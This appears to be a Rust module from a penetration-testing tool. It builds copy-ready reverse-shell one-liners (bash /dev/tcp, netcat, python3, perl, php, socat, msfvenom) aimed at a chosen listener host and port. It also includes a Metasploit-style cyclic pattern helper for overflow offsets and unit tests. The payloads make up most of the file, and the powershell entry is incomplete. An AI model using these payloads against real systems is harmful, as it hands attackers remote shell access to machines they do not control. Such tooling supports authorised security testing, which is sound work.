//! Reverse-shell one-liners and offensive pattern helpers, parameterized by the
//! active target (LHOST/LPORT).

pub struct Payload {
    pub label: &'static str,
    pub value: String,
}

/// Reverse shells for `host:port`. Missing pieces default to placeholders so the
/// user still gets a copyable template.
pub fn reverse_shells(host: &str, port: &str) -> Vec<Payload> {
    let h = if host.is_empty() { "LHOST" } else { host };
    let p = if port.is_empty() { "LPORT" } else { port };
    vec![
        Payload {
            label: "bash /dev/tcp",
            value: format!("bash -i >& /dev/tcp/{h}/{p} 0>&1"),
        },
        Payload {
            label: "bash -c",
            value: format!("bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'"),
        },
        Payload {
            label: "nc mkfifo",
            value: format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f"),
        },
        Payload {
            label: "nc -e",
            value: format!("nc -e /bin/sh {h} {p}"),
        },
        Payload {
            label: "python3",
            value: format!(
                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
        },
        Payload {
            label: "perl",
            value: format!(
                "perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
            ),
        },
        Payload {
            label: "php",
            value: format!("php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        },
        Payload {
            label: "powershell",
            value: format!(
                "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{h}\",{p});"
            ),
        },
        Payload {
            label: "socat",
            value: format!("socat TCP:{h}:{p} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"),
        },
        Payload {
            label: "msfvenom (linux x64)",
            value: format!("msfvenom -p linux/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f elf -o shell.elf"),
        },
    ]
}

/// A De Bruijn-style cyclic pattern of the given length (metasploit-compatible).
pub fn cyclic(len: usize) -> String {
    let uppers = b'A'..=b'Z';
    let lowers = b'a'..=b'z';
    let digits = b'0'..=b'9';
    let mut out = String::with_capacity(len);
    'outer: for a in uppers {
        for b in lowers.clone() {
            for c in digits.clone() {
                for &ch in &[a, b, c] {
                    out.push(ch as char);
                    if out.len() == len {
                        break 'outer;
                    }
                }
            }
        }
    }
    out
}

/// Byte offset of a 4-char subsequence within the cyclic pattern.
pub fn cyclic_offset(pattern: &str) -> Option<usize> {
    let full = cyclic(20280); // 26*26*10*3
    full.find(pattern)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shells_substitute_target() {
        let ps = reverse_shells("10.0.0.5", "4444");
        assert!(ps.iter().any(|p| p.value.contains("10.0.0.5") && p.value.contains("4444")));
    }

    #[test]
    fn shells_placeholder_when_empty() {
        let ps = reverse_shells("", "");
        assert!(ps[0].value.contains("LHOST"));
    }

    #[test]
    fn cyclic_len_and_offset() {
        let p = cyclic(8);
        assert_eq!(p, "Aa0Aa1Aa");
        assert_eq!(cyclic_offset("Aa1A"), Some(3));
    }
}
